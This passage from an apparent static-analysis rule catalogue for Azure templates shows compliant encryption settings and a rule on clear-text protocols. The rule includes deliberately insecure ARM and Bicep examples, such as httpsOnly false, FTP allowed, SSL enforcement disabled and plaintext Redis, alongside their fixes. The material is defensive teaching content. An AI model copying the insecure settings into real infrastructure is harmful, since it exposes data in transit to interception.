}\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.datalakestore/accounts\">Microsoft.DataLakeStore/accounts</a>:</p>\n<p>Enabled encryption for Data Lake Store:</p>\n<pre data-diff-id=\"501\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DataLakeStore/accounts\",\n      \"apiVersion\": \"2016-11-01\",\n      \"properties\": {\n        \"encryptionState\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"511\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.DataLakeStore/accounts@2016-11-01' = {\n  properties: {\n    encryptionState: 'Enabled'\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers\">Microsoft.DBforMySQL/servers</a>:</p>\n<p>Enabled infrastructure double encryption for MySQL server:</p>\n<pre data-diff-id=\"601\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DBforMySQL/servers\",\n      \"apiVersion\": \"2017-12-01\",\n      \"properties\": {\n        \"infrastructureEncryption\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"611\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {\n  properties: {\n    infrastructureEncryption: 'Enabled'\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/2017-12-01/servers\">Microsoft.DBforPostgreSQL/servers</a>:</p>\n<p>Enabled infrastructure double encryption for PostgreSQL server:</p>\n<pre data-diff-id=\"701\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.DBforPostgreSQL/servers\",\n      \"apiVersion\": \"2017-12-01\",\n      \"properties\": {\n        \"infrastructureEncryption\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"711\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.DBforPostgreSQL/servers@2017-12-01' = {\n  properties: {\n    infrastructureEncryption: 'Enabled'\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/fr-fr/azure/templates/microsoft.documentdb/cassandraclusters/datacenters\">Microsoft.DocumentDB/cassandraClusters/dataCenters</a>:</p>\n<p>Enabled encryption for a Cassandra Cluster datacenter’s managed disk and backup:</p>\n<pre data-diff-id=\"901\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"cassandraClusters/example\",\n      \"type\": \"Microsoft.DocumentDB/cassandraClusters/dataCenters\",\n      \"apiVersion\": \"2023-04-15\",\n      \"properties\": {\n        \"diskCapacity\": 4,\n        \"backupStorageCustomerKeyUri\": \"string\",\n        \"managedDiskCustomerKeyUri\": \"string\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"911\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.DocumentDB/cassandraClusters/dataCenters@2023-04-15' = {\n  name: 'string'\n  parent: parent\n  properties: {\n    diskCapacity: 4\n    backupStorageCustomerKeyUri: 'string'\n    managedDiskCustomerKeyUri: 'string'\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.hdinsight/clusters\">Microsoft.HDInsight/clusters</a>:</p>\n<p>Enabled encryption for data disk:</p>\n<pre data-diff-id=\"1301\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.HDInsight/clusters\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"computeProfile\": {\n          \"roles\": [\n            {\n              \"encryptDataDisks\": true\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1311\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {\n  properties: {\n    computeProfile: {\n      roles: [\n        {\n          encryptDataDisks: true\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for data disk at application level:</p>\n<pre data-diff-id=\"1302\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"clusters/example\",\n      \"type\": \"Microsoft.HDInsight/clusters/applications\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"computeProfile\": {\n          \"roles\": [\n            {\n              \"encryptDataDisks\": true\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1312\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.HDInsight/clusters/applications@2021-06-01' = {\n  properties: {\n    computeProfile: {\n      roles: [\n        {\n          encryptDataDisks: true\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for resource disk:</p>\n<pre data-diff-id=\"1303\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.HDInsight/clusters\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"diskEncryptionProperties\": {\n          \"encryptionAtHost\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1313\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {\n  properties: {\n    diskEncryptionProperties: {\n      encryptionAtHost: true\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.kusto/clusters\">Microsoft.Kusto/clusters</a>:</p>\n<p>Enabled encryption for disk:</p>\n<pre data-diff-id=\"1401\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Kusto/clusters\",\n      \"apiVersion\": \"2022-12-29\",\n      \"properties\": {\n        \"enableDiskEncryption\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1411\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Kusto/clusters@2022-12-29' = {\n  properties: {\n    enableDiskEncryption: true\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults\">Microsoft.RecoveryServices/vaults</a>:</p>\n<p>Enabled encryption on infrastructure:</p>\n<pre data-diff-id=\"1501\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.RecoveryServices/vaults\",\n      \"apiVersion\": \"2023-01-01\",\n      \"properties\": {\n        \"encryption\": {\n          \"infrastructureEncryption\": \"Enabled\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1511\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.RecoveryServices/vaults@2023-01-01' = {\n  properties: {\n    encryption: {\n      infrastructureEncryption: 'Enabled'\n    }\n  }\n}\n</pre>\n<p>Enabled encryption on infastructure for backup:</p>\n<pre data-diff-id=\"1502\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"vaults/example\",\n      \"type\": \"Microsoft.RecoveryServices/vaults/backupEncryptionConfigs\",\n      \"apiVersion\": \"2023-01-01\",\n      \"properties\": {\n        \"encryptionAtRestType\": \"{'CustomerManaged' | 'MicrosoftManaged'}\",\n        \"infrastructureEncryptionState\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1512\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.RecoveryServices/vaults/backupEncryptionConfigs@2023-01-01' = {\n  properties: {\n    encryptionAtRestType: '{CustomerManaged | MicrosoftManaged}'\n    infrastructureEncryptionState: 'Enabled'\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.redhatopenshift/openshiftclusters\">Microsoft.RedHatOpenShift/openShiftClusters</a>:</p>\n<p>Enabled disk encryption for master profile and worker profiles:</p>\n<pre data-diff-id=\"1601\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.RedHatOpenShift/openShiftClusters\",\n      \"apiVersion\": \"2022-09-04\",\n      \"properties\": {\n        \"masterProfile\": {\n          \"diskEncryptionSetId\": \"string\",\n          \"encryptionAtHost\": \"Enabled\"\n        },\n        \"workerProfiles\": [\n          {\n            \"diskEncryptionSetId\": \"string\",\n            \"encryptionAtHost\": \"Enabled\"\n          }\n        ]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1611\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.RedHatOpenShift/openShiftClusters@2022-09-04' = {\n  properties: {\n    masterProfile: {\n      diskEncryptionSetId: 'string'\n      encryptionAtHost: 'Enabled'\n    }\n    workerProfiles: [\n      {\n        diskEncryptionSetId: 'string'\n        encryptionAtHost: 'Enabled'\n      }\n    ]\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.sqlvirtualmachine/sqlvirtualmachines\">Microsoft.SqlVirtualMachine/sqlVirtualMachines</a>:</p>\n<p>Enabled encryption for SQL Virtual Machine:</p>\n<pre data-diff-id=\"801\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.SqlVirtualMachine/sqlVirtualMachines\",\n      \"apiVersion\": \"2022-08-01-preview\",\n      \"properties\": {\n        \"autoBackupSettings\": {\n          \"enableEncryption\": true,\n          \"password\": \"string\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"811\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.SqlVirtualMachine/sqlVirtualMachines@2022-08-01-preview' = {\n  properties: {\n    autoBackupSettings: {\n      enableEncryption: true\n      password: 'string'\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts\">Microsoft.Storage/storageAccounts</a>:</p>\n<p>Enabled enforcing of infrastructure encryption for double encryption of data:</p>\n<pre data-diff-id=\"1001\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Storage/storageAccounts\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"encryption\": {\n          \"requireInfrastructureEncryption\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1011\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n  properties: {\n    encryption: {\n      requireInfrastructureEncryption: true\n    }\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts/encryptionscopes?pivots=deployment-language-bicep\">Microsoft.Storage/storageAccounts/encryptionScopes</a>:</p>\n<p>Enabled enforcing of infrastructure encryption for double encryption of data at encryption scope level:</p>\n<pre data-diff-id=\"1002\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"storageAccounts/example\",\n      \"type\": \"Microsoft.Storage/storageAccounts/encryptionScopes\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"requireInfrastructureEncryption\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1012\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Storage/storageAccounts/encryptionScopes@2022-09-01' = {\n  properties: {\n    requireInfrastructureEncryption: true\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">Data encryption in Amazon EFS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/backup/backup-encryption\">Encryption in Azure Backup</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/mysql/single-server/concepts-security\">Security in Azure Database for MySQL</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/postgresql/single-server/concepts-security\">Security in Azure Database for PostgreSQL</a>\n  </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable?tabs=portal\">Infrastructure double encryption\n  of data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against tampering or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites\">Microsoft.Web/sites</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"name\": \"example\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"httpsOnly\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"8\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Web/sites@2022-03-01' = {\n  properties: {\n    httpsOnly: false // Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-web\">Microsoft.Web/sites/config</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites/config\",\n      \"name\": \"sites/example\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"ftpsState\": \"AllAllowed\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"9\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Web/sites/config@2022-09-01' = {\n  properties: {\n    ftpsState: 'AllAllowed' // Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts\">Microsoft.Storage/storageAccounts</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Storage/storageAccounts\",\n      \"name\": \"example\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"supportsHttpsTrafficOnly\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"10\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n  properties: {\n    supportsHttpsTrafficOnly: false // Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/apis\">Microsoft.ApiManagement/service/apis</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.ApiManagement/service/apis\",\n      \"name\": \"service/example\",\n      \"apiVersion\": \"2022-08-01\",\n      \"properties\": {\n        \"protocols\": [\"http\"]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.ApiManagement/service/apis@2022-08-01' = {\n  properties: {\n    protocols: ['http'] // Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.cdn/profiles/endpoints\">Microsoft.Cdn/profiles/endpoints</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Cdn/profiles/endpoints\",\n      \"name\": \"profiles/example\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"isHttpAllowed\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Cdn/profiles/endpoints@2021-06-01' = {\n  properties: {\n    isHttpAllowed: true // Sensitive\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.cache/redisenterprise/databases\">Microsoft.Cache/redisEnterprise/databases</a>:</p>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Cache/redisEnterprise/databases\",\n      \"name\": \"redisEnterprise/example\",\n      \"apiVersion\": \"2022-01-01\",\n      \"properties\": {\n        \"clientProtocol\": \"Plaintext\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"13\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Cache/redisEnterprise/databases@2022-01-01' = {\n  properties: {\n    clientProtocol: 'Plaintext' // Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers\">Microsoft.DBforMySQL/servers</a>, <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers\">Microsoft.DBforMariaDB/servers</a>, and <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers\">Microsoft.DBforPostgreSQL/servers</a>:</p>\n<pre data-diff-id=\"7\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DBforMySQL/servers\",\n      \"name\": \"example\",\n      \"apiVersion\": \"2017-12-01\",\n      \"properties\": {\n        \"sslEnforcement\": \"Disabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"14\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {\n  properties: {\n    sslEnforcement: 'Disabled' // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites\">Microsoft.Web/sites</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"name\": \"example\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"httpsOnly\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"8\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Web/sites@2022-03-01' = {\n  properties: {\n    httpsOnly: true\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-web\">Microsoft.Web/sites/config</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites/config\",\n      \"name\": \"sites/example\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"ftpsState\": \"FtpsOnly\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"9\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Web/sites/config@2022-09-01' = {\n  properties: {\n    ftpsState: 'FtpsOnly'\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts\">Microsoft.Storage/storageAccounts</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Storage/storageAccounts\",\n      \"name\": \"example\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"supportsHttpsTrafficOnly\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"10\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n  properties: {\n    supportsHttpsTrafficOnly: true\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/apis\">Microsoft.ApiManagement/service/apis</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.ApiManagement/service/apis\",\n      \"name\": \"service/example\",\n      \"apiVersion\": \"2022-08-01\",\n      \"properties\": {\n        \"protocols\": [\"https\"]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.ApiManagement/service/apis@2022-08-01' = {\n  properties: {\n    protocols: ['https']\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.cdn/profiles/endpoints\">Microsoft.Cdn/profiles/endpoints</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Cdn/profiles/endpoints\",\n      \"name\": \"profiles/example\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"isHttpAllowed\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Cdn/profiles/endpoints@2021-06-01' = {\n  properties: {\n    isHttpAllowed: false\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.cache/redisenterprise/databases\">Microsoft.Cache/redisEnterprise/databases</a>:</p>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Cache/redisEnterprise/databases\",\n      \"name\": \"redisEnterprise/example\",\n      \"apiVersion\": \"2022-01-01\",\n      \"properties\": {\n        \"clientProtocol\": \"Encrypted\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"13\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Cache/redisEnterprise/databases@2022-01-01' = {\n  properties: {\n    clientProtocol: 'Encrypted'\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers\">Microsoft.DBforMySQL/servers</a>, <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers\">Microsoft.DBforMariaDB/servers</a>, and <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers\">Microsoft.DBforPostgreSQL/servers</a>:</p>\n<pre data-diff-id=\"7\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DBforMySQL/servers\",\n      \"name\": \"example\",\n      \"apiVersion\": \"2017-12-01\",\n      \"properties\": {\n        \"sslEnforcement\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"14\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.DBforMySQL/servers@2017-12-01' = {\n  properties: {\n    sslEnforcement: 'Enabled'\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> 